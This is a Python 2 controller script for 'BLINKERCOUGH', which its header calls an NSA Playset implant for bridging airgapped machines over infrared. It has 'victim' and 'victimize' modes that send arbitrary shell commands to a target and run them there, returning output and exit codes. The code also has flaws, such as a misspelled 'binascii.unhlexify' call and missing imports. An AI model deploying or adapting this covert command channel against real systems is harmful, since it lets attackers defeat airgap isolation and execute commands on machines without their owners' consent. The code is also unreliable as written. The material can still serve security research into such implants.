#!/usr/bin/python
#
# BLINKERCOUGH: NSA Playset implant for IR bridging of airgap
#
# Copyright (C) 2015  Hacker, J.R. <r00tkillah@gmail.com>
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

from blinkercough import *
import sys
import os
import re

def output_hook(output):
    print output

def terminated_hook(code):
    print "command exited with exit code", code

def print_hook(packet):
    print binascii.unhlexify(packet)

if len(sys.argv) < 3:
    print "usage script <i2c bus or serial tty> <action>"
    sys.exit(1)

def convert(value):
    result = None
    hexstr = False
    if re.match('[\da-fA-F]+', value):
        hexstr = True
    try:
        if hexstr:
            result = int(value, 16)
        else:
            result = int(value, 0)
    except ValueError:
        print "can't convert '%s' to int" % value
        sys.exit(1)
    return result


dev = sys.argv[1]
devtype = None
BC = None
try:
    int(dev)
    # must be i2c
    devtype = 'i2c'
    BC = BlinkerCough(i2cDevice(int(dev)))
except ValueError:
    # must be a serial
    devtype = 'serial'
    BC = BlinkerCough(SerialDevice(dev, 115200))

action = sys.argv[2]
if action == 'getaddr':
    addr = BC.get_address()
    print "blinker cough address is:", addr
elif action == 'setaddr':
    if len(sys.argv) != 4:
        print "didn't supply address"
        sys.exit(1)
    BC.set_address(int(sys.argv[3]))
elif action == 'sendstuff':
    to = 0000
    if len(sys.argv) == 4:
        to = convert(sys.argv[3])
    BC.send(to, '\xF0'*120)
elif action == 'listen':
    BC.receive_hook = staticmethod(print_hook)
    print "waiting for packets at address 0x%04x" % BC.address
    sys.stdout.write("polling...")
    sys.stdout.flush()
    while True:
        BC.poll()
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()    
elif action == 'victim':
    print "playing the victim at address 0x%04x" % BC.address
    CR = CommandRunner()
    BC.receive_hook = CR.on_recv
    CommandRunner.send_hook = BC.send
    sys.stdout.write("polling...")
    sys.stdout.flush()
    while True:
        BC.poll()
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()
elif action == 'victimize':
    if len(sys.argv) != 5:
        print "victimize requires victim and cmd"
        sys.exit(1)
    victim = convert(sys.argv[3])
    cmd = sys.argv[4]
    print "victim: 0x%04x cmd '%s'" % (victim, cmd)
    CR = CommandRunner()
    BC.receive_hook = CR.on_recv
    CommandRunner.send_hook = BC.send
    CommandRunner.output_hook = staticmethod(output_hook)
    CommandRunner.terminated_hook = staticmethod(terminated_hook)
    CR.run_remote_command(victim, cmd)
    while True:
        BC.poll()
        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()

else:
    print "I don't action '%s'" % action
    print "actions available:"
    print " getaddr"
    print " setaddr"
    print " sendstuff"
    print " listen"
    print " victim"
    print " victimize"
    sys.exit(1)
